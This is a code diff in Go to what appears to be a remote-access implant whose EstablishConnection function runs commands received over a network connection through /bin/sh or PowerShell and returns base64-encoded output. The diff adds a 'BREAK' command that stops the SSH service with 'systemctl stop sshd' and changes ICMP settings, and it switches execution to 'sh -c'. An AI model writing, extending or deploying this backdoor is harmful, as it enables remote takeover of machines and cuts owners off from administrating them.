@@ -73,14 +73,30 @@ func EstablishConnection(port string) {
 		if args[0] == "cd" {
 			os.Chdir(trim(command[3:]))
 			conn.Write([]byte("\n"))
+		} else if strings.Contains(args[0], "BREAK:{") {
+			breaks := args[0]
+			breaks = breaks[strings.Index(breaks, "BREAK:{")+7 : strings.Index(breaks, "}")]
+			breakList := strings.Split(breaks, ",")
+			for _, brk := range breakList {
+				if runtime.GOOS == "linux" {
+					switch brk {
+					case "ssh.service":
+						Execute(FormatCommand("systemctl stop sshd"))
+					case "icmp":
+						Execute(FormatCommand("echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all"))
+					default:
+						respond("Error: Break not supported by client", conn)
+					}
+				}
+			}
 		} else {
 			if runtime.GOOS == "windows" {
 				cmd = exec.Command("powershell.exe", command)
 			} else {
-				cmd = exec.Command(args[0], args[1:]...)
+				cmd = exec.Command("/bin/sh", "-c", FormatCommand(command))
 			}
 			out, _ := cmd.CombinedOutput()
-			conn.Write([]byte(b64_encode(string(out)) + "\n"))
+			respond((b64_encode(string(out)) + "\n"), conn)
 			cmd.Run()
 		}
 
@@ -88,4 +104,21 @@ func EstablishConnection(port string) {
 
 		//Set input/output to the established connection's in/out
 	}
+}
+
+func FormatCommand(command string) string {
+	return strings.Replace(command, "\"", "\\\"", -1)
+}
+
+func Execute(command string) string {
+	// command = FormatCommand(command)
+	// command = strings.Split(command, " ")[0]
+	cmd := exec.Command("/bin/sh", "-c", command)
+	out, _ := cmd.CombinedOutput()
+	cmd.Run()
+	return string(out)
+}
+
+func respond(str string, conn net.Conn) {
+	conn.Write([]byte(str))
 }
